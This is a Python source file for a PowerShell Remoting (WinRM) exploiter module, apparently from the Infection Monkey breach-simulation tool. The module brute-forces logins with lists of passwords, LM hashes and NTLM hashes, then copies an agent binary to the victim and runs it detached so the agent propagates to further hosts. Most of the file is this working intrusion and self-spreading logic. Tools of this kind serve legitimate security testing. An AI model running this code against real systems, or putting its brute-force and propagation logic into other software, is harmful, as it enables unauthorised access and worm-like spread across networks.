import logging
from pathlib import Path, PurePath
from time import time
from typing import List, Optional

from common import OperatingSystem
from common.common_consts import AGENT_OTP_ENVIRONMENT_VARIABLE
from common.tags import (
    T1059_ATTACK_TECHNIQUE_TAG,
    T1105_ATTACK_TECHNIQUE_TAG,
    T1110_ATTACK_TECHNIQUE_TAG,
)
from common.types import AgentID, NetworkPort, PortStatus
from common.utils.environment import is_windows_os
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.powershell_utils.auth_options import AuthOptions, get_auth_options
from infection_monkey.exploit.powershell_utils.credentials import (
    Credentials,
    SecretType,
    get_credentials,
)
from infection_monkey.exploit.powershell_utils.powershell_client import (
    IPowerShellClient,
    PowerShellClient,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path, get_random_file_suffix
from infection_monkey.model import DROPPER_ARG, RUN_MONKEY
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)


POWERSHELL_EXPLOITER_TAG = "powershell-exploiter"
POWERSHELL_NO_SSL_PORT = NetworkPort(5985)
POWERSHELL_SSL_PORT = NetworkPort(5986)


class RemoteAgentCopyError(Exception):
    pass


class RemoteAgentExecutionError(Exception):
    pass


class PowerShellExploiter(HostExploiter):
    _EXPLOITED_SERVICE = "PowerShell Remoting (WinRM)"

    _EXPLOITER_TAGS = (
        POWERSHELL_EXPLOITER_TAG,
        T1059_ATTACK_TECHNIQUE_TAG,
        T1110_ATTACK_TECHNIQUE_TAG,
    )
    _PROPAGATION_TAGS = (
        POWERSHELL_EXPLOITER_TAG,
        T1059_ATTACK_TECHNIQUE_TAG,
        T1105_ATTACK_TECHNIQUE_TAG,
    )

    def __init__(self):
        super().__init__()
        self._client = None

    def _exploit_host(self):
        if not self._any_powershell_port_is_open():
            message = "PowerShell Remoting appears to be disabled on the remote host"
            self.exploit_result.error_message = message
            logger.debug(message)

            return self.exploit_result

        credentials = get_credentials(
            self.options["credentials"]["exploit_user_list"],
            self.options["credentials"]["exploit_password_list"],
            self.options["credentials"]["exploit_lm_hash_list"],
            self.options["credentials"]["exploit_ntlm_hash_list"],
            is_windows_os(),
        )

        auth_options = [get_auth_options(creds, self.host) for creds in credentials]

        self._client = self._authenticate_via_brute_force(credentials, auth_options)

        if self._is_interrupted():
            return self.exploit_result

        if not self._client:
            self.exploit_result.error_message = (
                "Unable to authenticate to the remote host using any of the available credentials"
            )
            return self.exploit_result

        execute_agent_timestamp = time()
        try:
            self._execute_monkey_agent_on_victim()
        except Exception as err:
            self.exploit_result.error_message = f"Failed to propagate to the remote host: {err}"
            self._publish_propagation_event(
                time=execute_agent_timestamp,
                success=False,
                error_message=self.exploit_result.error_message,
            )
            logger.error(self.exploit_result.error_message)
            return self.exploit_result

        self.exploit_result.propagation_success = True
        self._publish_propagation_event(time=execute_agent_timestamp, success=True)

        return self.exploit_result

    def _any_powershell_port_is_open(self) -> bool:
        return self._http_powershell_port_is_open() or self._https_powershell_port_is_open()

    def _http_powershell_port_is_open(self) -> bool:
        return (
            POWERSHELL_NO_SSL_PORT in self.host.ports_status.tcp_ports
            and self.host.ports_status.tcp_ports[POWERSHELL_NO_SSL_PORT].status == PortStatus.OPEN
        )

    def _https_powershell_port_is_open(self) -> bool:
        return (
            POWERSHELL_SSL_PORT in self.host.ports_status.tcp_ports
            and self.host.ports_status.tcp_ports[POWERSHELL_SSL_PORT].status == PortStatus.OPEN
        )

    def _authenticate_via_brute_force(
        self, credentials: List[Credentials], auth_options: List[AuthOptions]
    ) -> Optional[IPowerShellClient]:
        creds_opts_pairs = filter(self.check_ssl_setting_is_valid, zip(credentials, auth_options))
        for creds, opts in interruptible_iter(creds_opts_pairs, self.interrupt):
            try:
                client = PowerShellClient(str(self.host.ip), creds, opts)
                connect_timestamp = time()
                client.connect()
                logger.info(
                    f"Successfully logged into {self.host.ip} using Powershell. User: "
                    f"{creds.username}, Secret Type: {creds.secret_type.name}"
                )

                self._publish_exploitation_event(time=connect_timestamp, success=True)
                self.exploit_result.exploitation_success = True
                self._report_login_attempt(True, creds)

                return client
            except Exception as ex:
                error_message = (
                    f"Error logging into {self.host.ip} using Powershell. User: "
                    f"{creds.username}, SecretType: {creds.secret_type.name} -- Error: {ex}"
                )
                logger.debug(error_message)
                self._publish_exploitation_event(
                    time=connect_timestamp, success=False, error_message=error_message
                )
                self._report_login_attempt(False, creds)

        return None

    def check_ssl_setting_is_valid(self, creds_opts_pair):
        opts = creds_opts_pair[1]

        if opts.ssl and not self._https_powershell_port_is_open():
            return False

        if not opts.ssl and not self._http_powershell_port_is_open():
            return False

        return True

    def _report_login_attempt(self, result: bool, credentials: Credentials):
        if credentials.secret_type in [SecretType.PASSWORD, SecretType.CACHED]:
            self.report_login_attempt(result, credentials.username, password=credentials.secret)
        elif credentials.secret_type == SecretType.LM_HASH:
            self.report_login_attempt(result, credentials.username, lm_hash=credentials.secret)
        elif credentials.secret_type == SecretType.NT_HASH:
            self.report_login_attempt(result, credentials.username, ntlm_hash=credentials.secret)
        else:
            raise ValueError(f"Unknown secret type {credentials.secret_type}")

    def _execute_monkey_agent_on_victim(self):
        monkey_path_on_victim = get_agent_dst_path(self.host)

        self._copy_monkey_binary_to_victim(monkey_path_on_victim)
        logger.info("Successfully copied the monkey binary to the victim.")

        try:
            self._run_monkey_executable_on_victim(monkey_path_on_victim)
        except Exception as ex:
            raise RemoteAgentExecutionError(
                f"Failed to execute the agent binary on the victim: {ex}"
            )

    def _copy_monkey_binary_to_victim(self, monkey_path_on_victim: PurePath):
        temp_monkey_binary_filepath = Path(f"./monkey_temp_bin_{get_random_file_suffix()}")

        self._create_local_agent_file(temp_monkey_binary_filepath)

        try:
            logger.info(f"Attempting to copy the monkey agent binary to {self.host.ip}")
            self._client.copy_file(temp_monkey_binary_filepath, monkey_path_on_victim)
        except Exception as ex:
            raise RemoteAgentCopyError(f"Failed to copy the agent binary to the victim: {ex}")
        finally:
            if temp_monkey_binary_filepath.is_file():
                temp_monkey_binary_filepath.unlink()

    def _create_local_agent_file(self, binary_path):
        agent_binary_bytes = self.agent_binary_repository.get_agent_binary(OperatingSystem.WINDOWS)
        with open(binary_path, "wb") as f:
            f.write(agent_binary_bytes.getvalue())

    def _run_monkey_executable_on_victim(self, executable_path):
        set_agent_otp_command = (
            f"set {AGENT_OTP_ENVIRONMENT_VARIABLE}={self.otp_provider.get_otp()}"
        )
        monkey_execution_command = build_monkey_execution_command(
            self.agent_id, self.servers, self.current_depth + 1, executable_path
        )

        run_agent_command = f"{set_agent_otp_command} ; {monkey_execution_command}"

        logger.info(f"Attempting to execute the monkey agent on remote host " f"{self.host.ip}")

        self._client.execute_cmd_as_detached_process(run_agent_command)


def build_monkey_execution_command(
    agent_id: AgentID, servers: List[str], depth: int, executable_path: str
) -> str:
    monkey_params = build_monkey_commandline(
        agent_id,
        servers,
        depth=depth,
        location=executable_path,
    )

    return RUN_MONKEY % {
        "monkey_path": executable_path,
        "monkey_type": DROPPER_ARG,
        "parameters": monkey_params,
    }
